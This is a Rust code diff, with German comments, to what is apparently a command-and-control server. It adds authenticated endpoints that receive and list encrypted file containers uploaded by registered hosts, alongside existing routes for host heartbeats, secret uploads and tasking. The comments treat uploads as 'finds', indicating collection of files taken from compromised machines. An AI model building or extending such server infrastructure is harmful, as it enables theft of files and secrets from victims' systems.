@@ -26,9 +26,9 @@ use axum::{
 };
 use db::{Db, DbError};
 use kx_core::c2::{
-    CreateTaskRequest, HeartbeatRequest, LoginRequest, RegisterRequest, SecretUpload,
-    TaskResultRequest, PATH_HEARTBEAT, PATH_HOSTS, PATH_LOGIN, PATH_REGISTER, PATH_SECRETS,
-    PATH_TASKS, PATH_TASKS_CREATE, PATH_TASKS_RESULT,
+    CreateTaskRequest, FileUpload, HeartbeatRequest, LoginRequest, RegisterRequest, SecretUpload,
+    TaskResultRequest, PATH_FILES, PATH_HEARTBEAT, PATH_HOSTS, PATH_LOGIN, PATH_REGISTER,
+    PATH_SECRETS, PATH_TASKS, PATH_TASKS_CREATE, PATH_TASKS_RESULT,
 };
 
 /// Der gemeinsame Zustand der API-Handler.
@@ -184,6 +184,44 @@ async fn list_tasks(State(st): State<AppState>) -> impl IntoResponse {
     }
 }
 
+/// Nimmt einen KXENC-Datei-Container entgegen (Issue #31).
+///
+/// Der Host muss bekannt sein (400, ADR-0004); eine bereits abgelegte
+/// `file_id` desselben Hosts ist ein Duplikat (409) — der Container traegt
+/// keine authentifizierte Frische, ein wiederholter Upload ist kein neuer
+/// Fund.
+async fn upload_file(State(st): State<AppState>, Json(req): Json<FileUpload>) -> impl IntoResponse {
+    if req.host_id.is_empty() || req.file_id.is_empty() || req.container.is_empty() {
+        return (
+            StatusCode::BAD_REQUEST,
+            "host_id, file_id und container duerfen nicht leer sein",
+        )
+            .into_response();
+    }
+    match st.db.insert_file(&req) {
+        Ok(file) => (StatusCode::CREATED, Json(file)).into_response(),
+        Err(DbError::UnbekannterHost(id)) => (
+            StatusCode::BAD_REQUEST,
+            format!("unbekannter Host {id} — der Host muss vor der Datei registriert sein"),
+        )
+            .into_response(),
+        Err(DbError::DoppelteDatei(id)) => (
+            StatusCode::CONFLICT,
+            format!("Datei {id} ist fuer diesen Host bereits abgelegt"),
+        )
+            .into_response(),
+        Err(e) => (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()).into_response(),
+    }
+}
+
+/// Liefert alle Datei-Container als JSON.
+async fn list_files(State(st): State<AppState>) -> impl IntoResponse {
+    match st.db.list_files() {
+        Ok(files) => Json(files).into_response(),
+        Err(e) => (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()).into_response(),
+    }
+}
+
 /// Liefert das HTML-Dashboard (ohne Auth).
 ///
 /// Das HTML enthält keine Geheimnisse — die Daten holt sich das JavaScript
@@ -223,6 +261,8 @@ pub fn app(state: AppState) -> Router {
         .route(PATH_TASKS, get(list_tasks))
         .route(PATH_TASKS_CREATE, post(create_task))
         .route(PATH_TASKS_RESULT, post(report_task_result))
+        .route(PATH_FILES, post(upload_file))
+        .route(PATH_FILES, get(list_files))
         .route_layer(middleware::from_fn_with_state(
             state.clone(),
             auth::require_auth,
